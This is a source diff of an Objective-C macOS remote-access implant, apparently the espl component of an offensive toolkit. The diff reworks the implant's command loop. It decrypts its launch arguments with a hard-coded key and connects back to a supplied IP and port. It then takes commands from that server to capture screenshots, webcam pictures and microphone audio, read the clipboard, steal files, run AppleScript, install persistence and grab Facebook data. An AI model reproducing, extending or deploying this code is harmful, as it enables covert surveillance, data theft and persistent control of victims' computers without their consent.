@@ -8,9 +8,12 @@
 #import <Foundation/Foundation.h>
 #import <sys/socket.h>
 #import "AppKit/AppKit.h"
+#import "eshelper.h"
 #import "espl.h"
 NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
+NSString *logfile = @"/tmp/.esplog";
 espl *_espl;
+BOOL debug = false;
 
 //MARK: Main
 //log with this
@@ -19,15 +22,27 @@ espl *_espl;
 int main(int argc, const char * argv[]) {
     _espl = [[espl alloc] init];
     if (argc == 1) { return 0; }
+    
     //decrypt argument with shared key
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
     argument = [escryptor decryptB64ToNSString:bkey :argument];
-    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
-    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
-    _espl.skey = args[2];
-    _espl.terminator = [args[3] substringToIndex:16];
+    
+    //argument to json
+    NSError *initError = nil;
+    NSDictionary *initDictionary = [eshelper stringToJSON:argument :initError];
+    if (initError != nil) {
+        return 0;
+    }
+    //init params
+    NSString *ip = [initDictionary objectForKey:@"ip"];
+    int port = [[initDictionary objectForKey:@"port"] intValue];
+    _espl.skey = [initDictionary objectForKey:@"key"];
+    _espl.terminator = [initDictionary objectForKey:@"term"];
+    //debug = [[initDictionary objectForKey:@"debug"] boolValue];
+    //connect
+    int success = [_espl connect:ip :port];
     if (success == -1) {
-        NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
+        if (debug) system([[NSString stringWithFormat:@"echo 'unable to connect %@ %d %@ %@' >> %@",ip,port,_espl.skey,_espl.terminator,logfile] UTF8String]);
     }
     else {
         //send mac address, username@host info to server
@@ -40,31 +55,57 @@ int main(int argc, const char * argv[]) {
         while (read (sockfd, &buffer, sizeof(buffer))) {
             @autoreleasepool {
                 //decrypt received data
-                command = [escryptor decryptB64ToNSString:_espl.skey :
-                           [NSString stringWithFormat:@"%s",buffer]];
-                //json decode
+                command = [escryptor decryptB64ToNSString:_espl.skey : [NSString stringWithFormat:@"%s",buffer]];
+                //json decode decrypted received data
                 NSError *decodeError = nil;
-                NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
-                                                                     options: NSJSONReadingAllowFragments
-                                                                       error: &decodeError];
+                NSDictionary *receivedDictionary = [eshelper stringToJSON:command :decodeError];
+                //if there was an error with our input, a message is helpful
                 if (decodeError != nil) {
-                    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",command] UTF8String]);
+                    if (debug) system([[NSString stringWithFormat:@"echo '%@' >> %@",command,logfile] UTF8String]);
                     [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
                 }
-                
                 //assign
                 NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
                 NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
+                NSString *cmdType = [receivedDictionary objectForKey:@"type"];
                 _espl.terminator = [receivedDictionary objectForKey:@"term"];
                 
-                if ([cmd isEqualToString: @"exit"]) {
+                if (debug) system([[NSString stringWithFormat:@"echo '%@' >> %@",command,logfile] UTF8String]);
+                
+                //APPLESCRIPTS
+                if ([cmdType isEqualToString:@"applescript"]) {
+                    [_espl runAppleScript:cmd];
+                }
+                //UPLOADS + DOWNLOADS
+                else if ([cmdType isEqualToString:@"upload"]) {
+                    if ([cmd isEqualToString: @"upload"]) {
+                        [_espl receiveFileData:cmdArgument :[[receivedDictionary objectForKey:@"filesize"] longValue]];
+                    }
+                }
+                else if ([cmdType isEqualToString:@"download"]) {
+                    //TODO: Add better error handling
+                    NSData *rawdata = nil;
+                    if ([cmd isEqualToString: @"picture"]) {
+                        rawdata = [_espl takePicture];
+                    }
+                    else if ([cmd isEqualToString: @"download"]) {
+                        rawdata = [_espl filePathToData:cmdArgument];
+                    }
+                    else if ([cmd isEqualToString: @"screenshot"]) {
+                        rawdata = [_espl screenshot];
+                    }
+                    else {
+                        [_espl sendString:[NSString stringWithFormat:@"unable to perform %@",cmd]];
+                    }
+                    if (rawdata != nil) {
+                        [_espl sendFileData:rawdata];
+                    }
+                }
+                else if ([cmd isEqualToString: @"exit"]) {
                     exit(0);
                 }
-                else if ([cmd isEqualToString: @"getpid"]) {
+                else if ([cmd isEqualToString: @"pid"]) {
                     [_espl getPid];
-                }
-                else if ([cmd isEqualToString: @"screenshot"]) {
-                    [_espl screenshot];
                 }
                 else if ([cmd isEqualToString: @"getpaste"]) {
                     [_espl getPaste];
@@ -76,7 +117,6 @@ int main(int argc, const char * argv[]) {
                     [_espl set_brightness:cmdArgument];
                 }
                 else if ([cmd isEqualToString: @"ls"]) {
-                    printf("key = %s\n",[_espl.skey UTF8String]);
                     [_espl directoryList:cmdArgument];
                 }
                 else if ([cmd isEqualToString: @"cd"]) {
@@ -88,12 +128,6 @@ int main(int argc, const char * argv[]) {
                 else if ([cmd isEqualToString: @"pwd"]) {
                     [_espl sendString:_espl.fileManager.currentDirectoryPath];
                 }
-                else if ([cmd isEqualToString: @"download"]) {
-                    [_espl download:cmdArgument];
-                }
-                else if ([cmd isEqualToString: @"picture"]) {
-                    [_espl takePicture];
-                }
                 else if ([cmd isEqualToString: @"mic"]) {
                     [_espl mic:cmdArgument];
                 }
@@ -101,19 +135,13 @@ int main(int argc, const char * argv[]) {
                     [_espl openURL:cmdArgument];
                 }
                 else if ([cmd isEqualToString: @"persistence"]) {
-                    [_espl persistence:args[0]:args[1]];
+                    [_espl persistence:ip :port];
                 }
                 else if ([cmd isEqualToString: @"rmpersistence"]) {
-                    [_espl removePersistence:args[0]:args[1]];
+                    [_espl removePersistence:ip :port];
                 }
                 else if ([cmd isEqualToString: @"getfacebook"]) {
                     [_espl getFacebook];
-                }
-                else if ([cmd isEqualToString: @"upload"]) { //still need to do this
-                    [_espl receiveFile:cmd];
-                }
-                else if ([cmd isEqualToString: @"esrunosa"]) {
-                    [_espl runAppleScript:cmdArgument];
                 }
                 else {
                     if ([cmd isEqualToString:@"endtask"]) {
